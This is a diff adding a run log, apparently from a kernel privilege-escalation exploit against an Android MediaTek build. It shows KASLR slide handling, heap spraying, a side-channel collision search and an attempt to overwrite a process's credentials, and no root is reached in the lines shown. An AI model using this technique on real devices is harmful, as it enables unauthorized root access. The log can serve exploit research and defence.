@@ -1,0 +1,64 @@
+[32m[+] [0mpreload starting pid=15762
+[32m[+] [0mstartup context pid=15762 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=15762 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=15762 label=matisse_os2.0.6.0_ulkcnxm slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=15762 phys_offset=0000000080000000 kernel_phys_load=0000000080000000 delta=0000000000000000 slide_logger=ffffff80027913a0 bootid_data=ffffff80028a77d0 init_task=ffffff800279bec0 root_tg=ffffff8002992040 sysctl_bootid=ffffff8002a60bb5
+[33m[*] [0mmt16: skipping SLIDE warmup per PSELECT_SKIP_WARMUP
+[32m[+] [0mslide-kaslr-mtk-hardcoded pid=15762 base=ffffffc008000000 slide=0000000000000000 warmup=0
+[33m[*] [0mmt19: SLIDE trigger route (real CVE path)
+[33m[*] [0mmt28c: CRED overwrite mode
+[33m[*] [0mprepare_kernel_page enter: payload=1 (0=FOPS,1=SLIDE)
+[33m[*] [0mprepare_kernel_page: ctxs ready, cloning 272 prepare + 204 spray + 33 pre + 34 post...
+[33m[*] [0mprepare_kernel_page: prepare+spray children cloned, now spray...
+[33m[*] [0mprepare_kernel_page: spray children done, setup KernelSnitch...
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (4) mte disabled
+[33m[*] [0mmt18-diag: ks_setup done
+[33m[*] [0mmt18-diag: pre clones done
+[33m[*] [0mmt18-diag: leak child forked
+[33m[*] [0mmt18-diag: post clones done
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007aea1390c8
+[33m[*] [0mmt47-c: leak pin via SCM_RIGHTS OK (fd=517)
+[33m[*] [0mmt18-diag: memfds opened
+[33m[*] [0mmt18-diag: pre children killed
+[33m[*] [0m  0000006a642ce670
+[33m[*] [0mmt18-diag: post children killed
+[33m[*] [0m  0000006a64342a10
+[33m[*] [0mmt18-diag: spray children killed
+[33m[*] [0m  0000006a64fedf68
+[33m[*] [0mfound 3 collisisons
+[33m[*] [0mmt18-diag: leak child reaped (attempt 1)
+[33m[*] [0mprepare_kernel_page: checking KernelSnitch collisions...
+[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8200000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8200000000-ffffff8400000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8400000000-ffffff8600000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff8600000000-ffffff8800000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8c00000000-ffffff8e00000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8a00000000-ffffff8c00000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8800000000-ffffff8a00000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff8e00000000-ffffff9000000000]
+[33m[*] [0mprepare_kernel_page: SKB reclaim sends (2 rounds)...
+[33m[*] [0mdone
+[33m[*] [0mmt19: SLIDE page prepared base=0xffffff80e9bd0000
+[33m[*] [0mmt28c: perf task=0xffffff81f58b2500 (194/256 votes)
+[33m[*] [0mmt39: cred_cand=ffffff8217b8ec00 votes=54 (task=ffffff81f58b2500 diff=+573425408
+[33m[*] [0mmt40: task=ffffff81f58b2500 cred_addr=ffffff8217b8ec00 uid_ptr=ffffff8217b8ec00
+[33m[*] [0mmt48: PTR stage=R task=ffffff81f58b2500 pc=ffffff81f58b2c70 right=ffffff80e9bd2980 [PTR_RIGHT auto=spray_fake_cred] (STORE(a)→[task+0x778 real_cred])
+[33m[*] [0mmt28m: cred write attempt 1/1 fake_cred=ffffff80027b0ae0
+[33m[*] [0mmt33: child pid=21260 task=ffffff81f58b2500 blocking-for-cred-write
+[33m[*] [0mmt47: alive poll=50 uid=2000 CapEff=0000000000000000
+[33m[*] [0mmt47: alive poll=100 uid=2000 CapEff=0000000000000000
+[33m[*] [0mmt47: alive poll=150 uid=2000 CapEff=0000000000000000
+[33m[*] [0mmt47: alive poll=200 uid=2000 CapEff=0000000000000000
+[33m[*] [0mmt47: alive poll=250 uid=2000 CapEff=0000000000000000
+[33m[*] [0mmt47: alive poll=300 uid=2000 CapEff=0000000000000000
+[33m[*] [0mmt47: alive poll=350 uid=2000 CapEff=0000000000000000
+[33m[*] [0mmt47: alive poll=400 uid=2000 CapEff=0000000000000000
+[33m[*] [0mmt47: alive poll=450 uid=2000 CapEff=0000000000000000
+[33m[*] [0mmt47: alive poll=500 uid=2000 CapEff=0000000000000000
+[33m[*] [0mmt47: alive poll=550 uid=2000 CapEff=0000000000000000
+[33m[*] [0mmt47: alive poll=600 uid=2000 CapEff=0000000000000000
+[33m[*] [0mmt47: alive poll=650 uid=2000 CapEff=0000000000000000
+[33m[*] [0mmt47: alive poll=700 uid=2000 CapEff=0000000000000000
+[33m[*] [0mmt47: alive poll=750 uid=2000 CapEff=0000000000000000
